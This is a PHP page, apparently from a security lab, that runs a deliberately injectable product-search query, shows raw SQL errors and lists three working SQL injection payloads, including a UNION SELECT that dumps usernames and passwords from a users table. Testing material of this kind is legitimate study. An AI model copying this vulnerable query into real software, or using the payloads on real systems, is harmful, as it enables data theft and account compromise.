<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection Test - Debug Tool</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap Icons -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body class="bg-light">
    <?php include 'includes/header.php'; ?>
    
    <div class="container py-5">
        <div class="row justify-content-center">
            <div class="col-lg-10">
                <div class="card border-0 shadow-sm rounded-4 p-4 mb-4">
                    <h1 class="fw-bold mb-4 text-danger"><i class="bi bi-bug me-2"></i>SQL Injection Test Page</h1>
                    <p class="text-muted">Trang này dùng để debug và verify SQL injection payload. <strong>Cảnh báo:</strong> Trang này cực kỳ không an toàn.</p>
                    
                    <div class="bg-light p-3 rounded-3 mb-4">
                        <p class="mb-1"><strong>Input:</strong> <code class="text-primary"><?php echo htmlspecialchars($search); ?></code></p>
                        <?php if ($search): ?>
                            <?php
                            // Build query - VULNERABLE!
                            $query = "SELECT * FROM products WHERE name LIKE '%$search%' OR description LIKE '%$search%'";
                            ?>
                            <p class="mb-0"><strong>Query:</strong> <code class="text-danger"><?php echo htmlspecialchars($query); ?></code></p>
                        <?php endif; ?>
                    </div>

                    <?php
                    if ($search) {
                        $result = mysqli_query($conn, $query);
                        
                        if (!$result) {
                            echo "<div class='alert alert-danger border-0 shadow-sm mb-4'>
                                    <i class='bi bi-exclamation-triangle-fill me-2'></i>
                                    <strong>SQL Error:</strong> " . mysqli_error($conn) . "
                                  </div>";
                        } else {
                            $num_rows = mysqli_num_rows($result);
                            echo "<div class='alert alert-success border-0 shadow-sm mb-4 small'>
                                    <i class='bi bi-info-circle me-2'></i>
                                    <strong>Results:</strong> $num_rows rows found.
                                  </div>";
                            
                            if ($num_rows > 0) {
                                echo "<div class='table-responsive rounded-3 border'>
                                        <table class='table table-hover table-sm mb-0'>
                                            <thead class='table-dark small'>
                                                <tr>";
                                $fields = mysqli_fetch_fields($result);
                                foreach ($fields as $field) {
                                    echo "<th>" . htmlspecialchars($field->name) . "</th>";
                                }
                                echo "</tr>
                                            </thead>
                                            <tbody class='small'>";
                                
                                while ($row = mysqli_fetch_assoc($result)) {
                                    echo "<tr>";
                                    foreach ($row as $value) {
                                        echo "<td>" . htmlspecialchars($value ?? 'NULL') . "</td>";
                                    }
                                    echo "</tr>";
                                }
                                echo "</tbody>
                                        </table>
                                      </div>";
                            }
                        }
                    }
                    ?>
                </div>

                <div class="card border-0 shadow-sm rounded-4 p-4">
                    <h5 class="fw-bold mb-3"><i class="bi bi-terminal me-2"></i>Test Payloads</h5>
                    <div class="list-group list-group-flush">
                        <a href="?search=%25%27+UNION+SELECT+id%2Cusername%2Cpassword%2Cemail%2Cfull_name%2Cphone%2Caddress%2Crole%2Ccreated_at+FROM+users%23" 
                           class="list-group-item list-group-item-action border-0 px-0 py-3">
                            <div class="d-flex w-100 justify-content-between align-items-center">
                                <h6 class="mb-1 fw-bold text-primary">Payload 1: Dump Users</h6>
                                <span class="badge bg-info rounded-pill">9 columns</span>
                            </div>
                            <p class="mb-1 small text-muted">Lấy toàn bộ thông tin từ bảng <code>users</code>.</p>
                        </a>
                        <a href="?search=%25%27+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%23" 
                           class="list-group-item list-group-item-action border-0 px-0 py-3">
                            <div class="d-flex w-100 justify-content-between align-items-center">
                                <h6 class="mb-1 fw-bold text-primary">Payload 2: Test Column Count</h6>
                                <span class="badge bg-secondary rounded-pill">Test</span>
                            </div>
                            <p class="mb-1 small text-muted">Kiểm tra số lượng cột trả về (9 cột).</p>
                        </a>
                        <a href="?search=%25%27+OR+%271%27%3D%271" 
                           class="list-group-item list-group-item-action border-0 px-0 py-3">
                            <div class="d-flex w-100 justify-content-between align-items-center">
                                <h6 class="mb-1 fw-bold text-primary">Payload 3: Bypass Filter</h6>
                                <span class="badge bg-warning text-dark rounded-pill">Logic</span>
                            </div>
                            <p class="mb-1 small text-muted">Sử dụng <code>OR '1'='1'</code> để hiển thị tất cả sản phẩm.</p>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <?php include 'includes/footer.php'; ?>
</body>
</html>
